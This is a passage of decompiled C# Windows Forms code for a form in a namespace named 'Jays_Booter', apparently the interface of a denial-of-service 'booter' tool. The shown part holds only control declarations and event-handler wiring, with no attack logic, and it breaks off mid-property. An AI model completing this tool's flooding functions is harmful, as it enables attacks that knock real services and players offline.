using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DevComponents.DotNetBar;
using DevComponents.DotNetBar.Controls;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;

namespace Jays_Booter;

[DesignerGenerated]
public class frmMain : Office2007Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox pictureBox_0;

	[AccessedThroughProperty("Button1")]
	private ButtonX buttonX_0;

	[AccessedThroughProperty("TabControl1")]
	private TabControl tabControl_0;

	[AccessedThroughProperty("TabControlPanel1")]
	private TabControlPanel tabControlPanel_0;

	[AccessedThroughProperty("TabItem1")]
	private TabItem tabItem_0;

	[AccessedThroughProperty("TabControlPanel2")]
	private TabControlPanel tabControlPanel_1;

	[AccessedThroughProperty("TabItem2")]
	private TabItem tabItem_1;

	[AccessedThroughProperty("LabelX2")]
	private LabelX labelX_0;

	[AccessedThroughProperty("LabelX3")]
	private LabelX labelX_1;

	[AccessedThroughProperty("TextBox1")]
	private TextBoxX textBoxX_0;

	[AccessedThroughProperty("LabelX1")]
	private LabelX labelX_2;

	[AccessedThroughProperty("LabelX10")]
	private LabelX labelX_3;

	[AccessedThroughProperty("ButtonX6")]
	private ButtonX buttonX_1;

	[AccessedThroughProperty("ButtonX7")]
	private ButtonX buttonX_2;

	[AccessedThroughProperty("NumericUpDown1")]
	private NumericUpDown numericUpDown_0;

	[AccessedThroughProperty("TabItem4")]
	private TabItem tabItem_2;

	[AccessedThroughProperty("TabControlPanel4")]
	private TabControlPanel tabControlPanel_2;

	[AccessedThroughProperty("ButtonX5")]
	private ButtonX buttonX_3;

	[AccessedThroughProperty("ButtonX4")]
	private ButtonX buttonX_4;

	[AccessedThroughProperty("TextBoxX4")]
	private TextBoxX textBoxX_1;

	[AccessedThroughProperty("LabelX7")]
	private LabelX labelX_4;

	[AccessedThroughProperty("TextBoxX3")]
	private TextBoxX textBoxX_2;

	[AccessedThroughProperty("LabelX6")]
	private LabelX labelX_5;

	[AccessedThroughProperty("ListView2")]
	private ListView listView_0;

	[AccessedThroughProperty("ColumnHeader3")]
	private ColumnHeader columnHeader_0;

	[AccessedThroughProperty("ColumnHeader4")]
	private ColumnHeader columnHeader_1;

	[AccessedThroughProperty("TabItem3")]
	private TabItem tabItem_3;

	[AccessedThroughProperty("TabControlPanel3")]
	private TabControlPanel tabControlPanel_3;

	[AccessedThroughProperty("TextBoxX2")]
	private TextBoxX textBoxX_3;

	[AccessedThroughProperty("LabelX5")]
	private LabelX labelX_6;

	[AccessedThroughProperty("LabelX4")]
	private LabelX labelX_7;

	[AccessedThroughProperty("ListView1")]
	private ListView listView_1;

	[AccessedThroughProperty("TextBoxX1")]
	private TextBoxX textBoxX_4;

	[AccessedThroughProperty("ButtonX3")]
	private ButtonX buttonX_5;

	[AccessedThroughProperty("ButtonX2")]
	private ButtonX buttonX_6;

	[AccessedThroughProperty("ColumnHeader1")]
	private ColumnHeader columnHeader_2;

	[AccessedThroughProperty("ColumnHeader2")]
	private ColumnHeader columnHeader_3;

	[AccessedThroughProperty("TabItem5")]
	private TabItem tabItem_4;

	[AccessedThroughProperty("TextBoxX5")]
	private TextBoxX textBoxX_5;

	[AccessedThroughProperty("GroupPanel1")]
	private GroupPanel groupPanel_0;

	[AccessedThroughProperty("LabelX13")]
	private LabelX labelX_8;

	[AccessedThroughProperty("TextBoxX6")]
	private TextBoxX textBoxX_6;

	[AccessedThroughProperty("LabelX11")]
	private LabelX labelX_9;

	[AccessedThroughProperty("ButtonX8")]
	private ButtonX buttonX_7;

	[AccessedThroughProperty("TextBoxX7")]
	private TextBoxX textBoxX_7;

	[AccessedThroughProperty("Label7")]
	private Label label_0;

	[AccessedThroughProperty("Label6")]
	private Label label_1;

	[AccessedThroughProperty("Label5")]
	private Label label_2;

	[AccessedThroughProperty("ButtonX9")]
	private ButtonX buttonX_8;

	[AccessedThroughProperty("LabelX14")]
	private LabelX labelX_10;

	[AccessedThroughProperty("TextBoxX9")]
	private TextBoxX textBoxX_8;

	[AccessedThroughProperty("LabelX15")]
	private LabelX labelX_11;

	[AccessedThroughProperty("ButtonX11")]
	private ButtonX buttonX_9;

	[AccessedThroughProperty("TextBoxX10")]
	private TextBoxX textBoxX_9;

	[AccessedThroughProperty("TabControlPanel5")]
	private TabControlPanel tabControlPanel_4;

	[AccessedThroughProperty("TabItem6")]
	private TabItem tabItem_5;

	[AccessedThroughProperty("TextBoxX12")]
	private TextBoxX textBoxX_10;

	[AccessedThroughProperty("LabelX16")]
	private LabelX labelX_12;

	[AccessedThroughProperty("LabelX17")]
	private LabelX labelX_13;

	[AccessedThroughProperty("ListView4")]
	private ListView listView_2;

	[AccessedThroughProperty("ColumnHeader7")]
	private ColumnHeader columnHeader_4;

	[AccessedThroughProperty("ColumnHeader8")]
	private ColumnHeader columnHeader_5;

	[AccessedThroughProperty("TextBoxX13")]
	private TextBoxX textBoxX_11;

	[AccessedThroughProperty("ButtonX12")]
	private ButtonX buttonX_10;

	[AccessedThroughProperty("ButtonX13")]
	private ButtonX buttonX_11;

	[AccessedThroughProperty("TextBoxX8")]
	private TextBoxX textBoxX_12;

	[AccessedThroughProperty("LabelX8")]
	private LabelX labelX_14;

	[AccessedThroughProperty("LabelX9")]
	private LabelX labelX_15;

	[AccessedThroughProperty("ListView3")]
	private ListView listView_3;

	[AccessedThroughProperty("ColumnHeader5")]
	private ColumnHeader columnHeader_6;

	[AccessedThroughProperty("ColumnHeader6")]
	private ColumnHeader columnHeader_7;

	[AccessedThroughProperty("TextBoxX11")]
	private TextBoxX textBoxX_13;

	[AccessedThroughProperty("ButtonX1")]
	private ButtonX buttonX_12;

	[AccessedThroughProperty("ButtonX10")]
	private ButtonX buttonX_13;

	[AccessedThroughProperty("TextBoxX14")]
	private TextBoxX textBoxX_14;

	[AccessedThroughProperty("LabelX18")]
	private LabelX labelX_16;

	[AccessedThroughProperty("RadioButton5")]
	private RadioButton radioButton_0;

	[AccessedThroughProperty("RadioButton4")]
	private RadioButton radioButton_1;

	[AccessedThroughProperty("RadioButton3")]
	private RadioButton radioButton_2;

	[AccessedThroughProperty("RadioButton2")]
	private RadioButton radioButton_3;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton radioButton_4;

	[AccessedThroughProperty("ButtonX14")]
	private ButtonX buttonX_14;

	[AccessedThroughProperty("CheckBoxX3")]
	private CheckBoxX checkBoxX_0;

	[AccessedThroughProperty("CheckBoxX1")]
	private CheckBoxX checkBoxX_1;

	[AccessedThroughProperty("TabControlPanel6")]
	private TabControlPanel tabControlPanel_5;

	[AccessedThroughProperty("ListView5")]
	private ListView listView_4;

	[AccessedThroughProperty("ColumnHeader9")]
	private ColumnHeader columnHeader_8;

	[AccessedThroughProperty("ColumnHeader10")]
	private ColumnHeader columnHeader_9;

	[AccessedThroughProperty("TabItem9")]
	private TabItem tabItem_6;

	[AccessedThroughProperty("TabItem7")]
	private TabItem tabItem_7;

	[AccessedThroughProperty("TabItem8")]
	private TabItem tabItem_8;

	[AccessedThroughProperty("ColumnHeader11")]
	private ColumnHeader columnHeader_10;

	[AccessedThroughProperty("Time")]
	private ColumnHeader columnHeader_11;

	[AccessedThroughProperty("CheckBoxX2")]
	private CheckBoxX checkBoxX_2;

	[AccessedThroughProperty("RadioButton6")]
	private RadioButton radioButton_5;

	[AccessedThroughProperty("RadioButton7")]
	private RadioButton radioButton_6;

	[AccessedThroughProperty("LabelX12")]
	private LabelX labelX_17;

	[AccessedThroughProperty("LabelX19")]
	private LabelX labelX_18;

	private int int_0;

	private string[] string_0;

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return pictureBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			pictureBox_0 = value;
		}
	}

	internal virtual ButtonX Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (buttonX_0 != null)
			{
				((Control)buttonX_0).remove_Click(eventHandler);
			}
			buttonX_0 = value;
			if (buttonX_0 != null)
			{
				((Control)buttonX_0).add_Click(eventHandler);
			}
		}
	}

	internal virtual TabControl TabControl1
	{
		[DebuggerNonUserCode]
		get
		{
			return tabControl_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabControl_0 = value;
		}
	}

	internal virtual TabControlPanel TabControlPanel1
	{
		[DebuggerNonUserCode]
		get
		{
			return tabControlPanel_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabControlPanel_0 = value;
		}
	}

	internal virtual TabItem TabItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return tabItem_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabItem_0 = value;
		}
	}

	internal virtual TabControlPanel TabControlPanel2
	{
		[DebuggerNonUserCode]
		get
		{
			return tabControlPanel_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabControlPanel_1 = value;
		}
	}

	internal virtual TabItem TabItem2
	{
		[DebuggerNonUserCode]
		get
		{
			return tabItem_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabItem_1 = value;
		}
	}

	internal virtual LabelX LabelX2
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_0 = value;
		}
	}

	internal virtual LabelX LabelX3
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_1 = value;
		}
	}

	internal virtual TextBoxX TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = TextBox1_TextChanged;
			if (textBoxX_0 != null)
			{
				((Control)textBoxX_0).remove_TextChanged(eventHandler);
			}
			textBoxX_0 = value;
			if (textBoxX_0 != null)
			{
				((Control)textBoxX_0).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual LabelX LabelX1
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_2 = value;
		}
	}

	internal virtual LabelX LabelX10
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_3 = value;
		}
	}

	internal virtual ButtonX ButtonX6
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ButtonX6_Click;
			if (buttonX_1 != null)
			{
				((Control)buttonX_1).remove_Click(eventHandler);
			}
			buttonX_1 = value;
			if (buttonX_1 != null)
			{
				((Control)buttonX_1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ButtonX ButtonX7
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ButtonX7_Click;
			if (buttonX_2 != null)
			{
				((Control)buttonX_2).remove_Click(eventHandler);
			}
			buttonX_2 = value;
			if (buttonX_2 != null)
			{
				((Control)buttonX_2).add_Click(eventHandler);
			}
		}
	}

	internal virtual NumericUpDown NumericUpDown1
	{
		[DebuggerNonUserCode]
		get
		{
			return numericUpDown_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			numericUpDown_0 = value;
		}
	}

	internal virtual TabItem TabItem4
	{
		[DebuggerNonUserCode]
		get
		{
			return tabItem_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabItem_2 = value;
		}
	}

	internal virtual TabControlPanel TabControlPanel4
	{
		[DebuggerNonUserCode]
		get
		{
			return tabControlPanel_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabControlPanel_2 = value;
		}
	}

	internal virtual ButtonX ButtonX5
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			buttonX_3 = value;
		}
	}

	internal virtual ButtonX ButtonX4
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			buttonX_4 = value;
		}
	}

	internal virtual TextBoxX TextBoxX_0
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_1 = value;
		}
	}

	internal virtual LabelX LabelX7
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_4 = value;
		}
	}

	internal virtual TextBoxX TextBoxX_1
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_2 = value;
		}
	}

	internal virtual LabelX LabelX6
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_5 = value;
		}
	}

	internal virtual ListView ListView2
	{
		[DebuggerNonUserCode]
		get
		{
			return listView_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			listView_0 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader3
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_0 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader4
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_1 = value;
		}
	}

	internal virtual TabItem TabItem3
	{
		[DebuggerNonUserCode]
		get
		{
			return tabItem_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabItem_3 = value;
		}
	}

	internal virtual TabControlPanel TabControlPanel3
	{
		[DebuggerNonUserCode]
		get
		{
			return tabControlPanel_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabControlPanel_3 = value;
		}
	}

	internal virtual TextBoxX TextBoxX_2
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_3 = value;
		}
	}

	internal virtual LabelX LabelX5
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_6 = value;
		}
	}

	internal virtual LabelX LabelX4
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_7 = value;
		}
	}

	internal virtual ListView ListView1
	{
		[DebuggerNonUserCode]
		get
		{
			return listView_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			listView_1 = value;
		}
	}

	internal virtual TextBoxX TextBoxX_3
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_4 = value;
		}
	}

	internal virtual ButtonX ButtonX3
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			buttonX_5 = value;
		}
	}

	internal virtual ButtonX ButtonX2
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			buttonX_6 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader1
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_2 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader2
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_3 = value;
		}
	}

	internal virtual TabItem TabItem5
	{
		[DebuggerNonUserCode]
		get
		{
			return tabItem_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabItem_4 = value;
		}
	}

	internal virtual TextBoxX TextBoxX_4
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_5 = value;
		}
	}

	internal virtual GroupPanel GroupPanel1
	{
		[DebuggerNonUserCode]
		get
		{
			return groupPanel_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			groupPanel_0 = value;
		}
	}

	internal virtual LabelX LabelX13
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_8 = value;
		}
	}

	internal virtual TextBoxX TextBoxX_5
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_6 = value;
		}
	}

	internal virtual LabelX LabelX11
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_9 = value;
		}
	}

	internal virtual ButtonX ButtonX8
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ButtonX8_Click;
			if (buttonX_7 != null)
			{
				((Control)buttonX_7).remove_Click(eventHandler);
			}
			buttonX_7 = value;
			if (buttonX_7 != null)
			{
				((Control)buttonX_7).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBoxX TextBoxX_6
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_7 = value;
		}
	}

	internal virtual Label Label7
	{
		[DebuggerNonUserCode]
		get
		{
			return label_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			label_0 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return label_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			label_1 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return label_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			label_2 = value;
		}
	}

	internal virtual ButtonX ButtonX9
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ButtonX9_Click;
			if (buttonX_8 != null)
			{
				((Control)buttonX_8).remove_Click(eventHandler);
			}
			buttonX_8 = value;
			if (buttonX_8 != null)
			{
				((Control)buttonX_8).add_Click(eventHandler);
			}
		}
	}

	internal virtual LabelX LabelX14
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_10 = value;
		}
	}

	internal virtual TextBoxX TextBoxX_7
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_8 = value;
		}
	}

	internal virtual LabelX LabelX15
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_11 = value;
		}
	}

	internal virtual ButtonX ButtonX_0
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			buttonX_9 = value;
		}
	}

	internal virtual TextBoxX TextBoxX_8
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_9 = value;
		}
	}

	internal virtual TabControlPanel TabControlPanel5
	{
		[DebuggerNonUserCode]
		get
		{
			return tabControlPanel_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabControlPanel_4 = value;
		}
	}

	internal virtual TabItem TabItem6
	{
		[DebuggerNonUserCode]
		get
		{
			return tabItem_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabItem_5 = value;
		}
	}

	internal virtual TextBoxX TextBoxX_9
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_10 = value;
		}
	}

	internal virtual LabelX LabelX16
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_12 = value;
		}
	}

	internal virtual LabelX LabelX17
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_13 = value;
		}
	}

	internal virtual ListView ListView4
	{
		[DebuggerNonUserCode]
		get
		{
			return listView_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			listView_2 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader7
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_4 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader8
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_5 = value;
		}
	}

	internal virtual TextBoxX TextBoxX_10
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_11 = value;
		}
	}

	internal virtual ButtonX ButtonX_1
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ButtonX_1_Click;
			if (buttonX_10 != null)
			{
				((Control)buttonX_10).remove_Click(eventHandler);
			}
			buttonX_10 = value;
			if (buttonX_10 != null)
			{
				((Control)buttonX_10).add_Click(eventHandler);
			}
		}
	}

	internal virtual ButtonX ButtonX_2
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ButtonX_2_Click;
			if (buttonX_11 != null)
			{
				((Control)buttonX_11).remove_Click(eventHandler);
			}
			buttonX_11 = value;
			if (buttonX_11 != null)
			{
				((Control)buttonX_11).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBoxX TextBoxX_11
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_12 = value;
		}
	}

	internal virtual LabelX LabelX8
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_14 = value;
		}
	}

	internal virtual LabelX LabelX9
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_15 = value;
		}
	}

	internal virtual ListView ListView3
	{
		[DebuggerNonUserCode]
		get
		{
			return listView_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			listView_3 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader5
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_6 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader6
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_7 = value;
		}
	}

	internal virtual TextBoxX TextBoxX_12
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_13 = value;
		}
	}

	internal virtual ButtonX ButtonX1
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ButtonX1_Click;
			if (buttonX_12 != null)
			{
				((Control)buttonX_12).remove_Click(eventHandler);
			}
			buttonX_12 = value;
			if (buttonX_12 != null)
			{
				((Control)buttonX_12).add_Click(eventHandler);
			}
		}
	}

	internal virtual ButtonX ButtonX_3
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ButtonX_3_Click;
			if (buttonX_13 != null)
			{
				((Control)buttonX_13).remove_Click(eventHandler);
			}
			buttonX_13 = value;
			if (buttonX_13 != null)
			{
				((Control)buttonX_13).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBoxX TextBoxX_13
	{
		[DebuggerNonUserCode]
		get
		{
			return textBoxX_14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			textBoxX_14 = value;
		}
	}

	internal virtual LabelX LabelX18
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_16 = value;
		}
	}

	internal virtual RadioButton RadioButton5
	{
		[DebuggerNonUserCode]
		get
		{
			return radioButton_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RadioButton5_CheckedChanged;
			if (radioButton_0 != null)
			{
				radioButton_0.remove_CheckedChanged(eventHandler);
			}
			radioButton_0 = value;
			if (radioButton_0 != null)
			{
				radioButton_0.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton RadioButton4
	{
		[DebuggerNonUserCode]
		get
		{
			return radioButton_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = vDonobce4;
			if (radioButton_1 != null)
			{
				radioButton_1.remove_CheckedChanged(eventHandler);
			}
			radioButton_1 = value;
			if (radioButton_1 != null)
			{
				radioButton_1.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton RadioButton3
	{
		[DebuggerNonUserCode]
		get
		{
			return radioButton_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RadioButton3_CheckedChanged;
			if (radioButton_2 != null)
			{
				radioButton_2.remove_CheckedChanged(eventHandler);
			}
			radioButton_2 = value;
			if (radioButton_2 != null)
			{
				radioButton_2.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton RadioButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return radioButton_3;
		}
